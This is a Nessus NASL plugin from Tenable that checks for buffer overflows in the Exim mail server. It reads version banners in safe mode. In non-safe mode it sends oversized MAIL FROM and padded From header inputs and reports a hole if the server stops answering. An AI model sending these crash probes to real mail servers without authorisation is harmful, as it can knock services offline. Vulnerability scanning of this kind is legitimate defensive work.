#
# (C) Tenable Network Security
#

if(description)
{
 script_id(12232);
 script_version ("$Revision: 1.9 $");
 
 name["english"] = "Exim Multiple Overflows";
 script_name(english:name["english"]);
 
 desc["english"] = "
The remote host is running a version of the Exim MTA which is vulnerable
to several remote buffer overflows.  Specifically, if either 
'headers_check_syntax' or 'sender_verify = true' is in the exim.conf
file, then a remote attacker may be able to execute a classic stack-
based overflow and gain inappropriate access to the machine.

*** If you are running checks with safe_checks enabled, this may be a 
false positive as only banners were used to assess the risk! ***

It is known that Exim 3.35 and 4.32 are vulnerable.

Solution : Upgrade to Exim latest version
 
Risk factor : High";

 script_description(english:desc["english"]);
		    
 
 summary["english"] = "Exim Multiple Overflows";
 script_summary(english:summary["english"]);
 
 script_category(ACT_MIXED_ATTACK);
 
 script_copyright(english:"This script is Copyright (C) 2004 Tenable Network Security");
 
 
 family["english"] = "SMTP problems";
 family["francais"] = "Problèmes SMTP";
 script_family(english:family["english"], francais:family["francais"]);
 script_dependencie("smtpserver_detect.nasl");	# should we use the result from smtpscan?
 
 script_require_ports("Services/smtp", 25);
 exit(0);
}

#
# The script code starts here
#

include("smtp_func.inc");
port = get_kb_item("Services/smtp");
if(!port) port = 25;
if (! get_port_state(port)) exit(0);

banner = get_smtp_banner(port:port);
if(!banner)exit(0);
if (! egrep(string:banner, pattern:"Exim") ) exit(0);


if (safe_checks()) {
    if(egrep(pattern:"220.*Exim ([0-2]\.|3\.([0-2][0-9]|3[0-5])|4\.([0-2][0-9]|3[0-2]))", string:banner))
        security_hole(port);
    exit(0);
} else {
    soc = open_sock_tcp(port);
    if (!soc) exit(0);
    banner = smtp_recv_line(socket:soc);
    if ( ! banner ) exit(0);

    req = string("HELO x.x.x.x\r\n");
    req += string("MAIL FROM: ", crap(300), "@nessus.org\r\n\r\n");
    req += string("RCPT TO: web@localhost\r\n");
    req += string("DATA\r\n");
    req += string("blahblah\r\n.\r\nQUIT\r\n");
    send(socket:soc, data:req);
    r = recv_line(socket:soc, length:512);
    if (!r) { security_hole(port); exit(0); }
    close(soc);
 
    # non-safe check # 2
    req = string("HELO x.x.x.x\r\n");
    req += string("MAIL FROM: nessus@nessus.org\r\n");
    req += string("RCPT TO: web@localhost\r\n");
    req += string("DATA\r\n");
    req += string("From", crap(data:" ", length:275), ":nessus\r\n");
    req += string("blahblah\r\n.\r\nQUIT\r\n");
    soc = open_sock_tcp(port);
    if (!soc) { security_hole(port); exit(0); } 
    banner = smtp_recv_line(socket:soc);
    if ( ! banner ) exit(0);
    send(socket:soc, data:req);
    r = recv_line(socket:soc, length:512);
    if (!r) { security_hole(port); exit(0); } 
    close (soc);

    # non-safe check # 3
    req = string("HELO x.x.x.x\r\n");
    req += string("MAIL FROM: nessus@nessus.org\r\n");
    req += string("RCPT TO: web@localhost\r\n");
    req += string("DATA\r\n");
    req += string("From", crap(data:" ", length:275), ":nessus\r\n");
    req += string("blahblah\r\n.\r\nQUIT\r\n");
    soc = open_sock_tcp(port);
    if (!soc) { security_hole(port); exit(0); }
    banner = smtp_recv_line(socket:soc);
    if ( ! banner ) exit(0);
    send(socket:soc, data:req);
    r = recv_line(socket:soc, length:512);
    if (!r) { security_hole(port); exit(0); }
    close (soc);
    exit(0);
}



